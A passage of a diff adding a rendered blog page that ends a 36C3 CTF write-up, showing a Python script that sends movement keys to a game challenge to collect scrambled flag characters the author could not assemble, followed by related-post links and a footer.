+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">s</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">1</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">w</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)
+                keys<span style="color:#f92672">.</span>extend([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#34;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span>)
+
+                line <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+                <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> keys:
+                    io<span style="color:#f92672">.</span>sendline(key)
+                    line <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+                    <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                        flags<span style="color:#f92672">.</span>append(line)
+                        <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">** Got: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> line
+
+                <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">*** STARTING ****</span><span style="color:#e6db74">&#34;</span>
+                <span style="color:#75715e"># walk left and right and catch all chars</span>
+                <span style="color:#66d9ef">while</span> True:
+                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+                        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#34;</span>)
+                        line <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+                        <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                            flags<span style="color:#f92672">.</span>append(line)
+                            <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">** Got: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> line
+
+                        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Congrat</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                            <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">*** DONE ***</span><span style="color:#e6db74">&#34;</span>
+                            <span style="color:#66d9ef">print</span> line
+
+                    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">5</span>):
+                        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>)
+                        line <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()
+                        <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                            flags<span style="color:#f92672">.</span>append(line)
+                            <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">** Got: </span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> line
+                        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Congrat</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                            <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">*** DONE ***</span><span style="color:#e6db74">&#34;</span>
+                            <span style="color:#66d9ef">print</span> line
+
+            <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> line:
+                <span style="color:#66d9ef">print</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Dead</span><span style="color:#e6db74">&#34;</span>
+
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+        <span style="color:#66d9ef">print</span> flags
+
+doIt()
+</code></pre></div><p>Executing it dumps all flag characters:</p>
+<p><img src="/img/36c3ctf/dump.gif" alt="Catch The Flag"></p>
+<p>The flag characters therefore are: <code>hp0ctrw4_ax_n_0w{tg11tuhttny__0yc_3hd_d}nm</code></p>
+<p>There's only one issue: How to assemble the flag from this? I wasn't able to solve this during the CTF unfortunately :(
+Pls send help.</p>
+<hr>
+<p>Thanks to <a href="https://hxp.io/">hxp</a> for the great challenges and for hosting the CTF this year :)</p>
+</div>
+
+    
+    
+
+    
+
+    <h4 class="page-header">Related</h4>
+
+     <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/frida-fuzz/">In-Process Fuzzing With Frida</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/exploiting"><kbd class="item-tag">exploiting</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/fuzzing"><kbd class="item-tag">fuzzing</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/r2frida-1/">Dynamic Instrumentation: Frida And r2frida For Noobs</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/frida"><kbd class="item-tag">frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/r2frida"><kbd class="item-tag">r2frida</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+  <div class="item">
+
+    
+    
+    
+
+    
+
+    <h4><a href="/post/r2ctf-2019/">r2con 2019 CTF Writeups</a></h4>
+    <h5></h5>
+    
+    <a href="https://bananamafia.dev/tags/r2"><kbd class="item-tag">r2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/radare2"><kbd class="item-tag">radare2</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/ctf"><kbd class="item-tag">ctf</kbd></a>
+    
+    <a href="https://bananamafia.dev/tags/reverse-engineering"><kbd class="item-tag">reverse-engineering</kbd></a>
+    
+
+</div>
+ 
+
+    <footer>
+    <img style="width:42vh" src="/img/tag.png">
+
+    <p class="copyright text-muted">
+
+        © All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
+    </p>
+</footer>
+</body>
+
+</html>
+    
+
+</main>
